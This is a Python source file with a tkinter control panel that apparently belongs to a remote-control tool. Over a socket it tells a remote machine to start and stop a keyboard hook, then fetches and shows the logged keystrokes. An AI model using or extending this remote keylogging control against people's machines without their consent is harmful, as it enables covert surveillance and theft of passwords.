from tkinter import Tk, Text, Button
import socket


class KeystrokeClient:
    def __init__(self, client):
        self.client = client
        self.keylogger = ''
        self.HookClicked = False
        self.UnhookClicked = False

        self.Stroke = Tk()
        self.Stroke.title("Keystroke")
        self.Stroke.geometry("425x320")
        self.Stroke.configure(bg='#fff')
        self.Stroke.iconbitmap('./img/button/remoteIcon.ico')
        self.Stroke.resizable(False, False)

        self.tab = Text(self.Stroke, width=50, height=15)
        self.tab.grid(row=3, column=0, columnspan=4)

        hook = Button(self.Stroke, text="Hook", font="Helvetica 10 bold", width=6, bg="#000940", fg="#fff",
                      activebackground='#fff', padx=17, pady=20, command=self.Hookkey)
        hook.grid(row=1, column=0, sticky='e')

        unhook = Button(self.Stroke, text="Unhook", font="Helvetica 10 bold", width=6, bg="#000940", fg="#fff",
                        activebackground='#fff', padx=17, pady=20, command=self.Unhookkey)
        unhook.grid(row=1, column=1, sticky='e')

        print_button = Button(self.Stroke, text="Print", font="Helvetica 10 bold", width=6, bg="#000940", fg="#fff",
                              activebackground='#fff', padx=17, pady=20, command=self.Printkey)
        print_button.grid(row=1, column=2, sticky='e')

        delete = Button(self.Stroke, text="Delete", font="Helvetica 10 bold", width=6, bg="#000940", fg="#fff",
                        activebackground='#fff', padx=17, pady=25, command=self.Deletekey)
        delete.grid(row=1, column=3, sticky='e')

    def ReceiveHook(self):
        data = self.client.recv(1024).decode("utf-8")
        self.client.sendall(bytes(data, "utf-8"))
        return data

    def Hookkey(self):
        if self.HookClicked:
            return
        self.HookClicked = True
        self.UnhookClicked = False
        self.client.sendall(bytes("HookKey", "utf-8"))
        checkdata = self.client.recv(1024).decode("utf-8")

    def Unhookkey(self):
        if self.HookClicked:
            self.client.sendall(bytes("UnhookKey", "utf-8"))
            self.keylogger = self.ReceiveHook()
            self.client.sendall(bytes(self.keylogger, "utf-8"))
            self.UnhookClicked = True
            self.HookClicked = False

    def Printkey(self):
        if not self.UnhookClicked:
            self.client.sendall(bytes("UnhookKey", "utf-8"))
            self.keylogger = self.ReceiveHook()
        self.tab.delete(1.0, 'end')
        self.tab.insert(1.0, self.keylogger)
        self.UnhookClicked = True
        self.HookClicked = False

    def Deletekey(self):
        self.tab.delete(1.0, 'end')


def keystroke(client):
    keystroke_client = KeystrokeClient(client)
    keystroke_client.Stroke.mainloop()


# if __name__ == "__main__":
#     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#     HOST = 'your_server_ip_here'
#     PORT = 1234
#     client.connect((HOST, PORT))
#     keystroke(client)
#     client.close()
